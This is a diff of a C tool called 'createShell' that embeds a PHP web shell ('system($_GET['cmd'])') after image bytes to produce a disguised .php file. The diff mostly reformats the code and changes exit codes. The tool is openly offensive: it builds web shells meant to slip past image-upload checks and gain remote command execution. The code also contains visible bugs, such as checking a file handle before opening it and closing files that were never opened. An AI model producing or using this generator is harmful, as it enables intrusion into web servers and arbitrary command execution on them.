@@ -31,42 +31,29 @@ SOFTWARE.
 #define shell "<?php if($_GET){system($_GET['cmd']);}?>"
 #define read(buffer, size, var, wrvar) while(fgets(buffer, sizeof(size), var) != NULL){fprintf(wrvar, buffer);}
 
-void banner(void){
-	printf("\n\n______________________________________________\n\n\n\t# Desenvolvido por Adriel Freud!\n\t# Contato: businessc0rp2k17@gmail.com\n\t# FB: http://www.facebook.com/xrn401\n\t   =>DebutySecTeamSecurity<=\n\n_______________________________________________\n\n");
-}
-
-void fatal(char *msng){
-	fprintf(stderr, "[WARNING] - %s\n", msng);
-}
+void banner(void){printf("\n\n______________________________________________\n\n\n\t# Desenvolvido por Adriel Freud!\n\t# Contato: businessc0rp2k17@gmail.com\n\t# FB: http://www.facebook.com/xrn401\n\t   =>DebutySecTeamSecurity<=\n\n_______________________________________________\n\n");}
+void fatal(char *msng){fprintf(stderr, "[WARNING] - %s\n", msng);}
 
 int main(int argc, char *argv[]){
 	if(argc < 3){
 		banner();
 		fatal("Modo de Uso: root@localhost~# ./createShell imagem.*(jpeg, png) output.php");
 		fatal("Or: root@localhost~# ./createShell imagem.*(jpeg, png) output.php shell.php");
-		exit(0);
-
+		exit(EXIT_FAILURE);
 	}else{
-
-		FILE *output;
-		FILE *img;
+		FILE *output;FILE *img;
 		char size_i[sizeof(img)];
-
 		if (img == NULL){
 			banner();
 			fatal("\nImagem Nao Encontrada!");
 			fclose(img);
 			fclose(output);
-			exit(0);
-
+			exit(EXIT_FAILURE);
 		}else{
-
 			output = fopen(argv[2], "wb");
 			img = fopen(argv[1], "rb");
 			read(size_i, img, img, output);
-
 			if(argc > 3){
-
 				FILE *open_shell = fopen(argv[3], "rb");
 				char size_sh[sizeof(open_shell)];
 				read(size_sh, open_shell, open_shell, output);
@@ -74,9 +61,8 @@ int main(int argc, char *argv[]){
 			}else{
 				fprintf(output, shell);
 			}
-			fclose(img);
-			fclose(output);
-			return 0;
+			fclose(img);fclose(output);
 		}
 	}
+	return EXIT_SUCCESS;
 }
